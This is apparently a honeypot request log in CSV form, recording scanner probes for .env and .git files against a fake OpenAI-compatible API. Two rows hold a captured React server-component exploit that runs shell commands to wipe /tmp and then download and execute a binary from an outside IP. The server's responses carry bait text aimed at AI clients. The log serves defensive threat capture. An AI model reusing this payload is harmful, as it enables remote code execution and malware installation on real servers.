request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
9f8f1003-de7f-412e-9cc8-798819c10863,2026-04-14T02:39:05.694032+00:00,anon_5a9eae90,POST,/,[honeypot-host],Mozilla/5.0,,1567,316,1,,"------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""0""

""$1""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""1""

{""status"":""resolved_model"",""reason"":0,""_response"":""$5"",""value"":""{\""then\"":\""$4:map\"",\""0\"":{\""then\"":\""$B3\""},\""length\"":1}"",""then"":""$2:then""}
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""2""

""$@3""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""3""

""""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""4""

[]
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""5""

{""_bundlerConfig"":{},""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$4:constructor:constructor""},""_prefix"":""(function(){\n        try {\n            var res = process.mainModule.require(\""child_process\"").execSync(\""cd /tmp; pkill -9 morte; kill xd.x86; pkill -9 locker; killall -9 morte 2\u003e/dev/null; killall -9 locker 2\u003e/dev/null; rm -rf /tmp/* 2\u003e/dev/null; busybox wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /usr/bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /sbin/wget http://94.156.152.67:83/manji.x86 -O manji.x86; chmod 777 manji.x86; ./manji.x86 nextjs\"").toString();\n            console.log(\""\\n[+] RCE RESULT:\\n\"" + res);\n            throw new Error(\""[+] RCE SUCCESS: \"" + res);\n        } catch(e) {\n            console.log(e);\n            throw e;\n        }\n    })()//""}
------WebKitFormBoundaryReactCVE--
","------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""0""

""$1""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""1""

{""status"":""resolved_model"",""reason"":0,""_response"":""$5"",""value"":""{\""then\"":\""$4:map\"",\""0\"":{\""then\"":\""$B3\""},\""length\"":1}"",""then"":""$2:then""}
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""2""

""$@3""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""3""

""""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""4""

[]
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""5""

{""_bundlerConfig"":{},""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$4:constructor:constructor""},""_prefix"":""(function(){\n        try {\n            var res = process.mainModule.require(\""child_process\"").execSync(\""cd /tmp; pkill -9 morte; kill xd.x86; pkill -9 locker; killall -9 morte 2\u003e/dev/null; killall -9 locker 2\u003e/dev/null; rm -rf /tmp/* 2\u003e/dev/null; busybox wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /usr/bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /sbin/wget http://94.156.152.67:83/manji.x86 -O manji.x86; chmod 777 manji.x86; ./manji.x86 nextjs\"").toString();\n            console.log(\""\\n[+] RCE RESULT:\\n\"" + res);\n            throw new Error(\""[+] RCE SUCCESS: \"" + res);\n        } catch(e) {\n            console.log(e);\n            throw e;\n        }\n    })()//""}
------WebKitFormBoundaryReactCVE--
",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2fbf13c7-1ac7-4357-8192-b51aa62f395f,2026-04-14T02:40:19.624787+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d6d7a56f-b38f-4551-a2dc-18a9bd366a63,2026-04-14T03:04:35.966823+00:00,anon_cdea6a38,GET,/,[honeypot-host],"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
c0271b51-99fa-48bc-8084-890ca6dd8dbf,2026-04-14T03:48:06.067147+00:00,anon_706fb9c0,GET,/,[honeypot-host],"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
0f5083f2-1ca6-4bb1-acf5-1ef465fa24e4,2026-04-14T04:14:31.489870+00:00,anon_1ea754dc,GET,/,[honeypot-host],,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
a6287939-3131-459d-8016-b98692128aec,2026-04-14T04:23:09.063449+00:00,anon_b12cf458,GET,/boaform/admin/formLogin,,,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
cae7284a-28a3-47c5-a8d3-a1a83389d0e2,2026-04-14T04:35:36.746951+00:00,anon_9f4cc9ce,GET,/.env,[honeypot-host],Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
3344127d-99d7-42aa-af58-7a8c6effed64,2026-04-14T04:35:37.264494+00:00,anon_9f4cc9ce,GET,/.git/config,[honeypot-host],Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
5d60a481-008d-4cd9-8e0c-29df215d2689,2026-04-14T04:36:43.514079+00:00,anon_a82ef4dd,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
5f15d966-cb60-4fa5-891d-ef0f09841321,2026-04-14T05:10:28.809671+00:00,anon_6364fb00,GET,/,[honeypot-host],,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
ca500b12-86ac-4b32-b1ac-322defc617bd,2026-04-14T05:45:19.433729+00:00,anon_97447725,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/59.0.3022.85 Safari/537.32",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
887aacc4-f47c-4756-a2e7-d76c6d6676a4,2026-04-14T06:12:27.455378+00:00,anon_9668b431,GET,/,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
d279e171-71f7-4ca2-911a-c26c82d04b81,2026-04-14T06:33:10.795348+00:00,anon_2890c193,GET,/,[honeypot-host],,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
bb8db014-3d8e-421c-a4f2-2e4c3a2bd32e,2026-04-14T06:36:15.715281+00:00,anon_08fb99a9,GET,/,[honeypot-host],,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
0336b787-7d7d-4f64-ad90-e8059fbf7916,2026-04-14T06:39:50.940870+00:00,anon_a92d7bca,GET,/.env,[honeypot-host],Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9c3dbba7-2eab-473a-9664-10a89ce2e3af,2026-04-14T06:41:01.916576+00:00,anon_a92d7bca,GET,/.env,[honeypot-host],Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
18fdcc81-f02d-4a14-85db-ee45fc361981,2026-04-14T07:12:20.042916+00:00,anon_d62523e6,GET,/,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
879436d7-41be-40ad-9d09-6ef6deb8660a,2026-04-14T07:19:48.559912+00:00,anon_47d21071,GET,/.env,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9a3c10c6-1e96-46d9-b080-9990df710437,2026-04-14T07:21:17.462779+00:00,anon_4e9ac9ae,GET,/,[honeypot-host],,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
ab16e6d2-6c07-410e-8b30-0661c35c5656,2026-04-14T08:03:33.715745+00:00,anon_6d089a02,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
ba3b2706-039f-41a5-9cec-48fafb934ae4,2026-04-14T08:08:43.364233+00:00,anon_02e2f139,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
fa571377-ec79-449b-8fef-c701d41145d9,2026-04-14T08:34:44.688164+00:00,anon_5a9eae90,POST,/,[honeypot-host],Mozilla/5.0,,1567,316,1,,"------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""0""

""$1""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""1""

{""status"":""resolved_model"",""reason"":0,""_response"":""$5"",""value"":""{\""then\"":\""$4:map\"",\""0\"":{\""then\"":\""$B3\""},\""length\"":1}"",""then"":""$2:then""}
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""2""

""$@3""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""3""

""""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""4""

[]
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""5""

{""_bundlerConfig"":{},""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$4:constructor:constructor""},""_prefix"":""(function(){\n        try {\n            var res = process.mainModule.require(\""child_process\"").execSync(\""cd /tmp; pkill -9 morte; kill xd.x86; pkill -9 locker; killall -9 morte 2\u003e/dev/null; killall -9 locker 2\u003e/dev/null; rm -rf /tmp/* 2\u003e/dev/null; busybox wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /usr/bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /sbin/wget http://94.156.152.67:83/manji.x86 -O manji.x86; chmod 777 manji.x86; ./manji.x86 nextjs\"").toString();\n            console.log(\""\\n[+] RCE RESULT:\\n\"" + res);\n            throw new Error(\""[+] RCE SUCCESS: \"" + res);\n        } catch(e) {\n            console.log(e);\n            throw e;\n        }\n    })()//""}
------WebKitFormBoundaryReactCVE--
","------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""0""

""$1""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""1""

{""status"":""resolved_model"",""reason"":0,""_response"":""$5"",""value"":""{\""then\"":\""$4:map\"",\""0\"":{\""then\"":\""$B3\""},\""length\"":1}"",""then"":""$2:then""}
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""2""

""$@3""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""3""

""""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""4""

[]
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""5""

{""_bundlerConfig"":{},""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$4:constructor:constructor""},""_prefix"":""(function(){\n        try {\n            var res = process.mainModule.require(\""child_process\"").execSync(\""cd /tmp; pkill -9 morte; kill xd.x86; pkill -9 locker; killall -9 morte 2\u003e/dev/null; killall -9 locker 2\u003e/dev/null; rm -rf /tmp/* 2\u003e/dev/null; busybox wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /usr/bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /sbin/wget http://94.156.152.67:83/manji.x86 -O manji.x86; chmod 777 manji.x86; ./manji.x86 nextjs\"").toString();\n            console.log(\""\\n[+] RCE RESULT:\\n\"" + res);\n            throw new Error(\""[+] RCE SUCCESS: \"" + res);\n        } catch(e) {\n            console.log(e);\n            throw e;\n        }\n    })()//""}
------WebKitFormBoundaryReactCVE--
",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
